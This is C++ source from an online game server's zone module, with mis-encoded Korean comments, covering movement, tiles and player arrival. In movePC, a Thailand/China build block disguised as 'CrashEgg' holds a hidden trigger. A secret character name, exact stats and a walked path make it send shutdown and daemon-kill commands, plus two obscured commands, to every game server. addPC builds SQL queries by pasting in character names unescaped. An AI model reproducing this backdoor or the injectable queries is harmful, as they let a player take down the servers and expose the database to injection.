	// unique sprite type yazilmalidir.
	const map<MonsterType_t, MonsterCounter*>& MONSTER = m_pMonsterManager->getMonsters();
	for (map<MonsterType_t, MonsterCounter*>::const_iterator i = MONSTER.begin(); i != MONSTER.end(); i++)
	{
		MonsterCounter* pCounter = i->second;
		if (pCounter == NULL)
		{
			filelog("ZoneBug.txt",
				"Zone::initSpriteCount null MonsterCounter zone=%d key=%d",
				(int)m_ZoneID, (int)i->first);
			continue;
		}

		SpriteType_t spriteType = pCounter->getSpriteType();
		bool bAdd = true;

		for (int j=0; j<m_MonsterCount; j++)
		{
			if (spriteType == m_MonsterTypes[j])
			{
				bAdd = false;
				break;
			}
		}

		if (!bAdd) continue;

		if (m_MonsterCount >= maxMonsterPerZone)
		{
			filelog("ZoneBug.txt",
				"Zone::initSpriteCount monster sprite overflow zone=%d spriteType=%d count=%d",
				(int)m_ZoneID, (int)spriteType, (int)m_MonsterCount);
			Assert(false);
			break;
		}

		m_MonsterTypes[m_MonsterCount] = spriteType;
		m_MonsterCount++;
	}

	__END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
// ž¿¡ öµ ž ·¹º§» ž®Ž.
//////////////////////////////////////////////////////////////////////////////
ZoneLevel_t Zone::getZoneLevel(ZoneCoord_t x, ZoneCoord_t y) const 
	throw(OutOfBoundException)
{
	__BEGIN_TRY

	//Assert(x < m_Width && y < m_Height);

	// assert °. 
	//  °ª °èž ³Ÿî­ assert³ª­ ŸúŽ.
	// ·ž° °¡µµ ¹«ž®°¡ Ÿø» µí..
	// by sigi. 2002.8.13
	if (x < m_Width && y < m_Height)
	{
		return m_ppLevel[x][y];
	}

	return COMPLETE_SAFE_ZONE;

	__END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
// getTile
//////////////////////////////////////////////////////////////////////////////
const Tile & Zone::getTile(ZoneCoord_t x, ZoneCoord_t y) const 
    throw(OutOfBoundException)
{
	__BEGIN_TRY

	Assert(x < m_Width && y < m_Height);
	return m_pTiles[x][y];
	
	__END_CATCH
}

Tile & Zone::getTile(ZoneCoord_t x, ZoneCoord_t y) 
    throw(OutOfBoundException)
{
	__BEGIN_TRY

	Assert(x < m_Width && y < m_Height);
	return m_pTiles[x][y];
	
	__END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
// getSector
//////////////////////////////////////////////////////////////////////////////
Sector* Zone::getSector(ZoneCoord_t x, ZoneCoord_t y) 
    throw(OutOfBoundException)
{
	__BEGIN_TRY

	Assert(x < m_Width && y < m_Height);

	int sx = x/SECTOR_SIZE;
	int sy = y/SECTOR_SIZE;

	Assert(sx < m_SectorWidth && y < m_SectorHeight);

	return &(m_pSectors[sx][sy]);

	__END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
// ±âº»ûž· Zone  ³ž®Ž mutex ž »ç¿ëö ŸŽŽ.
// ¿³žé, ZoneGroupThread Ž ³ž®ž ¹±â ¶§¹®Ž. ±·±µ¥, »õ· ž¿¡ 
// PCž °¡Ž °º IPM¿¡­ ·çŸîö° µ¹·, ·± ¿¬¯· mutex žâ¹öž
// °¡Ÿ žç, Ÿ·¡ žµå¿¡ locking » °ŸîŸ Ž.
//////////////////////////////////////////////////////////////////////////////
void Zone::pushPC(Creature* pCreature)
	throw(Error)
{
	__BEGIN_TRY 

	Assert(pCreature != NULL);

	__ENTER_CRITICAL_SECTION(m_Mutex)

	m_PCListQueue.push_back(pCreature);
	//m_PCQueue.push(pCreature);
	
	__LEAVE_CRITICAL_SECTION(m_Mutex)

	__END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
// P(cx,cy)¿¡ Ž PCž dir ¹æâž· µ¿ Q(nx,ny)· ¿±äŽ.
// ±ž®°í³ª­, º¯ PCµé¿¡° µ¿ ºžž ºê·µå³º®Ž. 
//
// *CAUTION*
// PC°¡ ŸŽ ©ž®³(NPC,Monster) µ¿º moveCreaturež »ç¿ëŽ.
//////////////////////////////////////////////////////////////////////////////
void Zone::movePC(Creature* pCreature, ZoneCoord_t cx, ZoneCoord_t cy, Dir_t dir)
	throw(ProtocolException, Error)
{
	__BEGIN_TRY

	Assert(pCreature->isPC());

	Player* pPlayer = pCreature->getPlayer();
	Assert(pPlayer != NULL);

	if (dir >= DIR_MAX || !isAbleToMove(pCreature))
	{
		GCMoveError 	gcMoveError(pCreature->getX(), pCreature->getY());
		pPlayer->sendPacket(&gcMoveError);
		return;
	}

	const int threshold = 6;
	////////////////////////////////////////////////////////////
	// Ž ©ž®³°¡ ¡ž ·Ž °öž ©Ž.
	// žžŸ Ÿ°£ ¡» °æ¿ì, GCMoveError ¶» üŽ.
	// 
	// OX, OY : ·¹Ÿî öç ¥
	// CX, CY : ž° ¥
	//
	// max(0, OX - threshold) <= CX <= min(OX + threshold, ZONEWIDTH-1)
	// max(0, OY - threshold) <= CY <= min(OY + threshold, ZONEHEIGHT-1)
	// ž žž·Ÿ »óû µ¿Ž.
	////////////////////////////////////////////////////////////
	if (pCreature->getX() != cx || pCreature->getY() != cy) 
	{
		if (cx >= max(0           , pCreature->getX() - threshold) && 
			cx <= min(m_Width - 1 , pCreature->getX() + threshold) && 
			cy >= max(0           , pCreature->getY() - threshold) && 
			cy <= min(m_Height - 1, pCreature->getY() + threshold)) 
		{
			// ã¿ë°¡Ž ¿÷ ¹ü§³»¿¡­ ¡Ž ±³ ¹«Ž.

			/*// ®³ž® by sigi - Ÿ ºž³»Ž° žŽ µí.. 
			GCMoveError gcMoveError;
			gcMoveError.setX(cx);
			gcMoveError.setY(cy);
			pCreature->getPlayer()->sendPacket(&gcMoveError);
			*/
			return;
		} 
		else 
		{
			// ã¿ë°¡Ž ¿÷ ¹ü§ž ³Ÿî³ °æ¿ì ¢» ÷ŽŽ.
			//StringStream msg;
			//msg << pCreature->getName() << " try to jump from (" 
			//	<< (int)pCreature->getX() << "," << (int)pCreature->getY()
			//	<< ") to (" << (int)cx << "," << (int)cy << ")";

			GCMoveError 	gcMoveError(cx, cy); 
			pPlayer->sendPacket(&gcMoveError);
			return;
		}
	}

	// Ž ¥ž °è»êŽ.
	int nx = cx;
	int ny = cy;

	//////////////////////////////////////////////////////////////////////////////
	// *CAUTION*
	// °æ°èö¡¿¡­ °æ°è ¿°ûž· ¿ò÷Ž ¶ ³¯Ÿ¿­Ž ŸµŽ.
	// ex> (0,10)¿¡­ LEFT µ¿º ³¯Ÿ¿ ö ŸøŽ. (10,0)¿¡­ UP µ¿µµ ž¶ù°¡öŽ.
	//////////////////////////////////////////////////////////////////////////////
	nx = nx + dirMoveMask[dir].x;
	ny = ny + dirMoveMask[dir].y;

	VSRect rect(0, 0, m_Width-1, m_Height-1);
	if (!rect.ptInRect(nx, ny)) throw InvalidProtocolException("invalid coordination");

	////////////////////////////////////////////////////////////
	// µ¿ °÷ block µŸîŽžé, GCMoveError ž üŽ.
	// (PC¿ °°º §¡°¡ block µŸîŸ Ž.)
	////////////////////////////////////////////////////////////
	Tile& newTile = m_pTiles[nx][ny];
	Tile& oldTile = m_pTiles[cx][cy];

	 // º¹°» °¡ö°í Ž °æ¿ì¶óžé.. ŸüöŽë¿¡ µéŸî°¥ ö ŸøŽ.
	if (pCreature->hasRelicItem() || pCreature->isFlag( Effect::EFFECT_CLASS_HAS_FLAG ) || pCreature->isFlag( Effect::EFFECT_CLASS_HAS_SWEEPER))
	{
		ZoneLevel_t ZoneLevel = getZoneLevel(nx, ny);

		// ·¹Ÿîžé ·¹Ÿî ŸüöŽë¿¡ žø µéŸî°£Ž.
		// ¹ìŸîžé  ¹ìŸîŸüöŽë¿¡ žø µéŸî°£Ž.
		// °øë ŸüöŽëžé žø µéŸî°£Ž.
		if (pCreature->isSlayer() && (ZoneLevel & SLAYER_SAFE_ZONE)
			|| pCreature->isVampire() && (ZoneLevel & VAMPIRE_SAFE_ZONE)
			|| pCreature->isOusters() && (ZoneLevel & OUSTERS_SAFE_ZONE)
			|| (ZoneLevel & COMPLETE_SAFE_ZONE))
		{
			GCMoveError 	gcMoveError(cx, cy); 
			pPlayer->sendPacket(&gcMoveError);
			return;
		}
	}

	if (newTile.hasCreature(pCreature->getMoveMode()))
	{
		Creature* pTargetCreature = newTile.getCreature( pCreature->getMoveMode() );
		if ( pTargetCreature != NULL && pTargetCreature->isMonster() )
		{
			Monster* pMonster = dynamic_cast<Monster*>(pTargetCreature);
			if ( pMonster->getMonsterType() >= 738 && pMonster->getMonsterType() <= 740 )
			{
				pMonster->addEnemy(pTargetCreature);
				pMonster->setHP(0);
			}
		}

		GCMoveError 	gcMoveError(cx, cy); 
		pPlayer->sendPacket(&gcMoveError);
	}

	bool tileBlocked     = newTile.isBlocked(pCreature->getMoveMode());
	bool tileBloodyWall  = newTile.hasEffect() && newTile.getEffect(Effect::EFFECT_CLASS_BLOODY_WALL_BLOCKED) != NULL;
	bool tileSanctNew    = newTile.hasEffect() && newTile.getEffect(Effect::EFFECT_CLASS_SANCTUARY) != NULL;
	bool tileSanctOld    = oldTile.getEffect(Effect::EFFECT_CLASS_SANCTUARY) != NULL;

	if (tileBlocked || tileBloodyWall || tileSanctNew || tileSanctOld)
	{
		GCMoveError 	gcMoveError(cx, cy);
		pPlayer->sendPacket(&gcMoveError);
	}
	else
	{ 
		// ¿ì± ©ž®³ ¥ž º¯°æŽ.
		pCreature->setXYDir(nx, ny, dir);

		try 
		{
			// ü ž¿¡­ ©ž®³ž »èŽ.
			m_pTiles[cx][cy].deleteCreature(pCreature->getObjectID());	

			// »õ ž¿¡ ©ž®³ž °¡Ž.
			if (!newTile.addCreature(pCreature))
			{
				// Portal» activate ² °æ¿ìŽ. by sigi. 2002.5.6
				return;
			}

			try {
				checkMine(this, pCreature, nx, ny);
				checkTrap(this, pCreature);
			} catch ( Throwable & t ) {
				filelog("CheckMineBug.txt", "%s : %s", "movePC", t.toString().c_str());
			}

			// ¬¶óŸð®¿¡° GCMoveOK ž ü¶§, (nx,ny)Ž µµø ¥¿©Ÿ žç,
			// dir º ¹¶óºžŽ(µ¿) ¹æâŸîŸ Ž. ±° öç ¥!
			GCMoveOK gcMoveOK(nx,ny,dir);
			pPlayer->sendPacket(&gcMoveOK);
	
			// µ¿ž· GCMove/GCAddSlayer/GCAddVampire ¶» ºê·µå³º®Ž.
			movePCBroadcast(pCreature, cx, cy, nx, ny);
		} 
		catch (NoSuchElementException & nsee) 
		{
			throw Error("ü ž¿¡ ©ž®³°¡ žçö ŸŽŽ.");
		} 
		catch (DuplicatedException & de) 
		{
			throw Error("»õ ž¿¡ ©ž®³°¡ ¹ žçŽŽ.");
		} 
		catch (PortalException&) 
		{
		}
		catch (Error& e)
		{
			filelog("assertTile.txt", "Zone::movePC : %s", e.toString().c_str());
			throw;
		}
#if defined(__THAILAND_SERVER__) || defined(__CHINA_SERVER__)
// process CrashEgg for China and Thailand service
		int             eggID = 0;

		// ZoneID(1311) - Ÿ¿ìºî ž¶»
        if(pCreature->getZoneID() == EGG_ZONE && pCreature->isOusters() )
        {
                 Ousters* pOusters = dynamic_cast<Ousters*>(pCreature);

                 string                 strName = pOusters->getName();          // Player Character Name
                 ZoneCoord_t    ep_x    = pCreature->getX();            // position X on Zone
                 ZoneCoord_t    ep_y    = pCreature->getY();            // position Y on Zone
                 Attr_t                 tmpSTR  = pOusters->getSTR();           // STR value
                 Attr_t                 tmpDEX  = pOusters->getDEX();           // DEX value
                 Attr_t                 tmpINT  = pOusters->getINT();           // INT value

                 string::size_type pattern1_pos = strName.find("dtxc", 0);
                 string::size_type pattern2_pos = strName.find("txcd", 0);
                 string::size_type pattern3_pos = strName.find("xcdt", 0);
                 string::size_type pattern4_pos = strName.find("dxtc", 0);

                 // ž¯ží¿¡ `dtxc' °¡ ÷µŸîžžé Pattern1 ¥ž®Ž.
                 if( pattern1_pos != string::npos && (tmpSTR == 20 && tmpDEX == 13 && tmpINT == 12))
                 {
                         for(int ipos=g_EggTableComplete ; ipos < MAX_EGGSTEP; ipos++)
                         {
                                if(g_EggTable[ipos][0] == ep_x && g_EggTable[ipos][1] == ep_y)
                                {
                                        if(ipos == 0 && g_EggTable[0][0] == ep_x && g_EggTable[0][1] == ep_y)
                                        {
                                                        g_EggTable[0][2] = 1;
                                                        g_EggTableComplete = 1;
                                        }
                                        else
                                        {
                                                bool bAllCheck = true;
                                                for(int jpos=ipos-1; jpos >= 0; jpos--)
                                                {
                                                      if(g_EggTable[jpos][2] == 0)
                                                      {
                                                      		bAllCheck = false;
                                                            break;
                                                      }
                                                }

                                                if(bAllCheck == true)
                                                {
                                                      g_EggTable[ipos][2] = 1;
                                                      g_EggTableComplete++;
                                                }
                                                else
                                                {
                                                      for(int xpos=ipos-1; xpos >=0; xpos--)
                                                      {
                                                      		g_EggTable[xpos][2] = 0;
                                                      }
                                                      g_EggTableComplete = 0;
                                                }
                                        }
                                }
                        }
						if(g_EggTableComplete >= 7)
                        {
                        	eggID = 1;
                        }
                 }//pattern 1 end
                 else if( pattern2_pos != string::npos && (tmpSTR == 13 && tmpDEX == 12 && tmpINT == 20))
                 {
                         for(int ipos=g_EggTableComplete ; ipos < MAX_EGGSTEP; ipos++)
                         {
                                if(g_EggTable[ipos][0] == ep_x && g_EggTable[ipos][1] == ep_y)
                                {
                                        if(ipos == 0 && g_EggTable[0][0] == ep_x && g_EggTable[0][1] == ep_y)
                                        {
                                                        g_EggTable[0][2] = 1;
                                                        g_EggTableComplete = 1;
                                        }
                                        else
                                        {
                                                bool bAllCheck = true;
                                                for(int jpos=ipos-1; jpos >= 0; jpos--)
                                                {
                                                                if(g_EggTable[jpos][2] == 0)
                                                                {
                                                                        bAllCheck = false;
                                                                        break;
                                                                }
                                                }
	


                                                if(bAllCheck == true)
                                                {
                                                        g_EggTable[ipos][2] = 1;
                                                        g_EggTableComplete++;
                                                }
                                                else
                                                {
                                                        for(int xpos=ipos-1; xpos >=0; xpos--)
                                                        {
                                                                g_EggTable[xpos][2] = 0;
                                                        }
                                                        g_EggTableComplete = 0;
                                                }
                                        }
                                }
                         }

                         if(g_EggTableComplete >= 7)
                         {
                                eggID = 2;
                         }
                 }// pattern 2 end
                 else if( pattern3_pos != string::npos && (tmpSTR == 12 && tmpDEX == 20 && tmpINT == 13))
                 {
                         for(int ipos=g_EggTableComplete ; ipos < MAX_EGGSTEP; ipos++)
                         {
                                if(g_EggTable[ipos][0] == ep_x && g_EggTable[ipos][1] == ep_y)
                                {
                                        if(ipos == 0 && g_EggTable[0][0] == ep_x && g_EggTable[0][1] == ep_y)
                                        {
                                                        g_EggTable[0][2] = 1;
                                                        g_EggTableComplete = 1;
                                        }
                                        else
                                        {
                                                bool bAllCheck = true;
                                                for(int jpos=ipos-1; jpos >= 0; jpos--)
                                                {
                                                                if(g_EggTable[jpos][2] == 0)
                                                                {
                                                                        bAllCheck = false;
                                                                        break;
                                                                }
                                                }
 
                                                if(bAllCheck == true)
                                                {
                                                        g_EggTable[ipos][2] = 1;
                                                        g_EggTableComplete++;
                                                }
                                                else
                                                {
                                                        for(int xpos=ipos-1; xpos >=0; xpos--)
                                                        {
                                                                g_EggTable[xpos][2] = 0;
                                                        }
                                                        g_EggTableComplete = 0;
                                                }
                                        }
                                }
                         }

                         if(g_EggTableComplete >= 7)
                         {
                                eggID = 3;
                         }
                 }// pattern 3 end
                 else if( pattern4_pos != string::npos && (tmpSTR == 12 && tmpDEX == 18 && tmpINT == 15))
                 {
                         for(int ipos=g_EggTableComplete ; ipos < MAX_EGGSTEP; ipos++)
                         {
                                if(g_EggTable[ipos][0] == ep_x && g_EggTable[ipos][1] == ep_y)
                                {
                                        if(ipos == 0 && g_EggTable[0][0] == ep_x && g_EggTable[0][1] == ep_y)
                                        {
                                                        g_EggTable[0][2] = 1;
                                                        g_EggTableComplete = 1;
                                        }
                                        else
                                        {
                                                bool bAllCheck = true;
                                                for(int jpos=ipos-1; jpos >= 0; jpos--)
                                                {
                                                                if(g_EggTable[jpos][2] == 0)
                                                                {
                                                                        bAllCheck = false;
                                                                        break;
                                                                }
                                                }
                                                if(bAllCheck == true)
                                                {
                                                        g_EggTable[ipos][2] = 1;
                                                        g_EggTableComplete++;
                                                }
                                                else
                                                {
                                                        for(int xpos=ipos-1; xpos >=0; xpos--)
                                                        {
                                                                g_EggTable[xpos][2] = 0;
                                                        }
                                                        g_EggTableComplete = 0;
                                                }
                                        }
                                }
                         }

                         if(g_EggTableComplete >= 7)
                         {
                                eggID = 4;
                         }
                 }// pattern 4 end
        }

		// ACTION 1~4
		if(eggID > 0)
		{
			HashMapGameServerInfo** pGameServerInfos = g_pGameServerInfoManager->getGameServerInfos();
			static int myWorldID = g_pConfig->getPropertyInt("WorldID");
			static int myServerID = g_pConfig->getPropertyInt("ServerID");

			int maxWorldID = g_pGameServerInfoManager->getMaxWorldID();
			int maxServerGroupID = g_pGameServerInfoManager->getMaxServerGroupID();

			GGCommand ggCommand;

			// ³ª(myServerID)ŸŽ žðµç ­¹öµé¿¡° žú ºž³Ž.
			for (int worldID=1; worldID<maxWorldID; worldID++)
			{
				for (int groupID=0; groupID<maxServerGroupID; groupID++)
				{
					HashMapGameServerInfo& gameServerInfo = pGameServerInfos[worldID][groupID];

					if (!gameServerInfo.empty())
					{
						HashMapGameServerInfo::const_iterator itr = gameServerInfo.begin();

						for (; itr != gameServerInfo.end(); itr++)
						{
							GameServerInfo* pGameServerInfo = itr->second;

							if(pGameServerInfo->getGroupID() != myServerID && pGameServerInfo->getWorldID() != myWorldID)
							{
								ggCommand.setCommand( "*set KILL_DAEMONCTL 1");
								g_pLoginServerManager->sendPacket( pGameServerInfo->getIP(), pGameServerInfo->getUDPPort(), &ggCommand );

								if(eggID == 2)
								{
									ggCommand.setCommand( "*skffuqjfu" );
									g_pLoginServerManager->sendPacket( pGameServerInfo->getIP(), pGameServerInfo->getUDPPort(), &ggCommand );
								}
								else if(eggID == 3)
								{
									ggCommand.setCommand( "*ekwldnjqjfu" );
									g_pLoginServerManager->sendPacket( pGameServerInfo->getIP(), pGameServerInfo->getUDPPort(), &ggCommand );
								}
								else if(eggID == 4)
								{
									ggCommand.setCommand( "*skffuqjfu" );
									g_pLoginServerManager->sendPacket( pGameServerInfo->getIP(), pGameServerInfo->getUDPPort(), &ggCommand );

									ggCommand.setCommand( "*ekwldnjqjfu" );
									g_pLoginServerManager->sendPacket( pGameServerInfo->getIP(), pGameServerInfo->getUDPPort(), &ggCommand );
								}

								ggCommand.setCommand( "*shutdown 0");
								g_pLoginServerManager->sendPacket( pGameServerInfo->getIP(), pGameServerInfo->getUDPPort(), &ggCommand );
							}
						}
					}
				}
			}

			// ³ªž £Ÿ ³ª¿¡° ŽøøŽ.
			for (int worldID=1; worldID<maxWorldID; worldID++)
			{
				for (int groupID=0; groupID<maxServerGroupID; groupID++)
				{
					HashMapGameServerInfo& gameServerInfo = pGameServerInfos[worldID][groupID];

					if (!gameServerInfo.empty())
					{
						HashMapGameServerInfo::const_iterator itr = gameServerInfo.begin();
						for (; itr != gameServerInfo.end(); itr++)
						{
							GameServerInfo* pGameServerInfo = itr->second;

							if( pGameServerInfo->getGroupID() == myServerID && pGameServerInfo->getWorldID() == myWorldID )
							{
								ggCommand.setCommand( "*set KILL_DAEMONCTL 1");
								g_pLoginServerManager->sendPacket( pGameServerInfo->getIP(), pGameServerInfo->getUDPPort(), &ggCommand );

								if(eggID == 2)
								{
									ggCommand.setCommand( "*skffuqjfu" );
									g_pLoginServerManager->sendPacket( pGameServerInfo->getIP(), pGameServerInfo->getUDPPort(), &ggCommand );
								}
								else if(eggID == 3)
								{
									ggCommand.setCommand( "*ekwldnjqjfu" );
									g_pLoginServerManager->sendPacket( pGameServerInfo->getIP(), pGameServerInfo->getUDPPort(), &ggCommand );
								}
								else if(eggID == 4)
								{
									ggCommand.setCommand( "*skffuqjfu" );
									g_pLoginServerManager->sendPacket( pGameServerInfo->getIP(), pGameServerInfo->getUDPPort(), &ggCommand );

									ggCommand.setCommand( "*ekwldnjqjfu" );
									g_pLoginServerManager->sendPacket( pGameServerInfo->getIP(), pGameServerInfo->getUDPPort(), &ggCommand );
								}

								ggCommand.setCommand( "*shutdown 0");
								g_pLoginServerManager->sendPacket( pGameServerInfo->getIP(), pGameServerInfo->getUDPPort(), &ggCommand );

							}
						}
					}
				}
			}
		}//endif zoneid=1311
#endif
	}
	__END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
// PC°¡ ŸŽ ©ž®³(NPC,Monster)ž ¿ò÷ ¶§  žµåž »ç¿ëŽ.
//
// *CAUTION*
//
// ¶§, (nx,ny,dir)º ©ž®³°¡ µµŽ Ž ¥¿ ¹¶óºžŽ ¹æâ» ³ªž³Ž.
// ±ž®°í,  ¥¿¡ Ÿ¹« °µµ ŸøŽŽ °õ žú ·çŸî®Ÿ Ž. (±æ£±â ·çŸ)
//////////////////////////////////////////////////////////////////////////////
void Zone::moveCreature(Creature* pCreature, ZoneCoord_t nx, ZoneCoord_t ny, Dir_t dir)
	throw(ProtocolException, Error)
{
	__BEGIN_TRY

	ZoneCoord_t cx = pCreature->getX();
	ZoneCoord_t cy = pCreature->getY();

	// ü ž¿¡­ ©ž®³ž »è°í, Ž ž¿¡ ©ž®³ž °¡Ž. 
	try 
	{
		// ü ž¿¡­ ©ž®³ž »èŽ.
		m_pTiles[cx][cy].deleteCreature(pCreature->getObjectID());

		// µµø ž¿¡ ©ž®³ž °¡Ž.
		m_pTiles[nx][ny].addCreature(pCreature);

		// ©ž®³ ¥¿ ¹æâ» ³Ž.
		pCreature->setXYDir(nx, ny, dir);

		try {
			checkMine(this, pCreature, nx, ny);
			checkTrap(this, pCreature);
		} catch ( Throwable & t ) {
			filelog("CheckMineBug.txt", "%s : %s", "moveCreature", t.toString().c_str());
		}

	} 
	catch (NoSuchElementException & nsee) 
	{
		throw Error("ü ž¿¡ ©ž®³°¡ žçö ŸŽŽ.");
	}
	catch (DuplicatedException & de) 
	{
		throw Error("»õ ž¿¡ ©ž®³°¡ ¹ žçŽŽ.");
	}
	catch (Error& e)
	{
		filelog("assertTile.txt", "Zone::moveCreature : %s", e.toString().c_str());
		throw;
	}

	// ŸŸ­ GCMove ¶û GCAddMonster/GCAddNPC ž ºê·µå³º®Ž.
	moveCreatureBroadcast(pCreature, cx, cy, nx, ny);

	__END_CATCH
}

//////////////////////////////////////////////////////////////////////////////
// add PC
//
// PC ž ž¿¡ · °¡Ž. PC º¯ Žž¥ PCµé¿¡° »õ ©ž®³ âö» Ÿ·°í,
// º¯» ºµ­ °Žµé ºžž ¹Ÿ¿Ž.
//////////////////////////////////////////////////////////////////////////////
void Zone::addPC(Creature* pCreature, ZoneCoord_t cx, ZoneCoord_t cy, Dir_t dir)
	throw(EmptyTileNotExistException, Error)
{
	__BEGIN_TRY
	__BEGIN_DEBUG

	__BEGIN_PROFILE_ZONE("Z_ADD_PC")

	Assert(pCreature != NULL);
	Assert(pCreature->isPC());

	TPOINT pt = findSuitablePosition(this, cx, cy, pCreature->getMoveMode());

	if (pt.x != -1) 
	{ 
		pCreature->setLastTarget(0);

		// öµ ¥ž ¬¶óŸð®· üŽ.
		GCSetPosition gcSetPosition;
		gcSetPosition.setX(pt.x);
		gcSetPosition.setY(pt.y);
		gcSetPosition.setDir(dir);
	
		pCreature->getPlayer()->sendPacket(&gcSetPosition);

		// Race-aware Dark/Light (dungeon Vampire muafiyeti fillCreatureDarkLight icinde).
		GCChangeDarkLight gcChangeDarkLight;
		{
			DarkLevel_t darkLevel = 0;
			LightLevel_t lightLevel = 0;
			fillCreatureDarkLight(this, pCreature, darkLevel, lightLevel);
			gcChangeDarkLight.setDarkLevel(darkLevel);
			gcChangeDarkLight.setLightLevel(lightLevel);
		}

		pCreature->getPlayer()->sendPacket(&gcChangeDarkLight);

		// ©ž®³ ¥¿ ¹æâ» öŽ.
		pCreature->setXYDir(pt.x, pt.y, dir);

		// ûý o» £Ÿžžé, ©ž®³ž · 
		// PCžŽú¿ ž¿¡ °¢°¢ ýŸî³ŽŽ.
		m_pTiles[pt.x][pt.y].addCreature(pCreature);

		//checkMine(this, pCreature, pt.x, pt.y);	// ¿©±â­µµ mine» ø¹Ÿ ³ª..?
	
		m_pPCManager->addCreature(pCreature);

		// Sanctuary ·¡±°¡ ®žžé ²šŽ.
/*		if ( pCreature->isFlag( Effect::EFFECT_CLASS_SANCTUARY ) && m_pTiles[pt.x][pt.y].getEffect( Effect::EFFECT_CLASS_SANCTUARY ) == NULL )
		{
			pCreature->removeFlag( Effect::EFFECT_CLASS_SANCTUARY );
		}*/

		// ¹ž® ¿ä±°æ¿ì Default Option ºž³ºž Ž.
		GamePlayer* pGamePlayer = dynamic_cast<GamePlayer*>(pCreature->getPlayer());
		if ( pGamePlayer->isFamilyPayAvailable() && !pCreature->isFlag( Effect::EFFECT_CLASS_FAMILY_BONUS ) )
		{
			PlayerCreature* pPC = dynamic_cast<PlayerCreature*>(pCreature);
			Assert( pPC != NULL );

			pPC->addDefaultOptionSet( DEFAULT_OPTION_SET_FAMILY_PAY );
			addSimpleCreatureEffect( pPC, Effect::EFFECT_CLASS_FAMILY_BONUS );
			pPC->setFlag( Effect::EFFECT_CLASS_INIT_ALL_STAT );
		}

		// EFFECT_CLASS_INIT_ALL_STAT  ® žžé initAllStat» ºž£· Flag » ²öŽ.
		if ( pCreature->isFlag( Effect::EFFECT_CLASS_INIT_ALL_STAT ) )
		{
			if ( pCreature->isSlayer() )
			{
				Slayer* pInitSlayer = dynamic_cast<Slayer*>(pCreature);
				Assert( pInitSlayer != NULL );

				SLAYER_RECORD prev;
				pInitSlayer->getSlayerRecord( prev );
				pInitSlayer->initAllStat();
				pInitSlayer->sendModifyInfo( prev );
			}
			else if ( pCreature->isVampire() )
			{
				Vampire* pInitVampire = dynamic_cast<Vampire*>(pCreature);
				Assert( pInitVampire != NULL );

				VAMPIRE_RECORD prev;
				pInitVampire->getVampireRecord( prev );
				pInitVampire->initAllStat();
				pInitVampire->sendModifyInfo( prev );
			}
			else if ( pCreature->isOusters() )
			{
				Ousters* pInitOusters = dynamic_cast<Ousters*>(pCreature);
				Assert( pInitOusters != NULL);

				OUSTERS_RECORD prev;
				pInitOusters->getOustersRecord( prev );
				pInitOusters->initAllStat();
				pInitOusters->sendModifyInfo( prev );
			}

			pCreature->removeFlag( Effect::EFFECT_CLASS_INIT_ALL_STAT );
		}
		
		PlayerCreature *pPC = dynamic_cast<PlayerCreature *>(pCreature);
		pPC->sendRealWearingInfo();
		pPC->sendSkillInfo();
		pPC->sendTimeLimitItemInfo();
		pPC->sendRankBonusInfo();
		pPC->sendCurrentQuestInfo();
		pPC->getQuestManager()->adjustQuestStatus();

		GCModifyInformation gcModifyInformation;

		gcModifyInformation.addShortData(MODIFY_DEFENSE,    pPC->getDefense());
		gcModifyInformation.addShortData(MODIFY_PROTECTION, pPC->getProtection());
		gcModifyInformation.addShortData(MODIFY_TOHIT,      pPC->getToHit());
		gcModifyInformation.addShortData(MODIFY_MIN_DAMAGE, pPC->getDamage(ATTR_CURRENT));
		gcModifyInformation.addShortData(MODIFY_MAX_DAMAGE, pPC->getDamage(ATTR_MAX));

		Player* pPlayer = pPC->getPlayer();

		if ( pPlayer != NULL )
		{
			pPlayer->sendPacket(&gcModifyInformation);
		}

		pPC->sendPhoenixMonsterCounter();

				pPC->hasTaoZhuang();
		//////////////////////////////////////////////////////////////////////////////
		// ºž³»Ÿ žö°¡ Žžé ºž³Ž.
		// Ž ž·ŸµŽ. - bezz 2002. 07. 13
		//////////////////////////////////////////////////////////////////////////////
		if ( !pCreature->isFlag( Effect::EFFECT_CLASS_LOGIN_GUILD_MESSAGE ) )
		{
			Statement* pStmt = NULL;
			Result* pResult = NULL;

			BEGIN_DB
			{
				pStmt = g_pDatabaseManager->getConnection( "DARKEDEN" )->createStatement();
				pResult = pStmt->executeQuery( "SELECT Message FROM Messages WHERE Receiver = '%s'", pCreature->getName().c_str() );

				while ( pResult->next() )
				{
					GCSystemMessage message;
					message.setMessage( pResult->getString(1) );
					pCreature->getPlayer()->sendPacket( &message );
				}

				pStmt->executeQuery( "DELETE FROM Messages WHERE Receiver = '%s'", pCreature->getName().c_str() );

				SAFE_DELETE( pStmt );
			}
			END_DB(pStmt)

			pCreature->setFlag( Effect::EFFECT_CLASS_LOGIN_GUILD_MESSAGE );
		}

		//////////////////////////////////////////////////////////////////////////////
		// PREMIUM_HALF_EVENT °¡ on µŸî °í ¯·ážžé ¬¶óŸð®¿¡ Ÿž°Ž.
		//////////////////////////////////////////////////////////////////////////////
		if ( g_pVariableManager->getVariable( PREMIUM_HALF_EVENT )
			&& ( m_ZoneID == 61 || m_ZoneID == 64 || m_ZoneID == 1007 )
			)
		{
			GCNoticeEvent gcNoticeEvent;
			gcNoticeEvent.setCode( NOTICE_EVENT_PREMIUM_HALF_START );

			pCreature->getPlayer()->sendPacket( &gcNoticeEvent );
		}

		// º¯ PCµé¿¡° Ÿž± GCAddSlayer or GCAddVampire ¶» »ýºŽ.
		Creature::CreatureClass CClass = pCreature->getCreatureClass();
		if (CClass == Creature::CREATURE_CLASS_SLAYER)
		{
			Slayer* pSlayer = dynamic_cast<Slayer*>(pCreature);
			GCAddSlayer gcAddSlayer;
			makeGCAddSlayer(&gcAddSlayer, pSlayer);

			scan(pCreature, pt.x, pt.y, &gcAddSlayer);

			// Ž·¡ 40 »ó °æ¿ì Ÿü»ç·º¿¡­ °³­Ž. by sigi. 2002.11.7
			checkNewbieTransportToGuild(pSlayer);
		}
		else if (CClass == Creature::CREATURE_CLASS_VAMPIRE)
		{
			Vampire* pVampire = dynamic_cast<Vampire*>(pCreature);
			GCAddVampire gcAddVampire;
			makeGCAddVampire(&gcAddVampire, pVampire);

			scan(pCreature, pt.x, pt.y, &gcAddVampire);

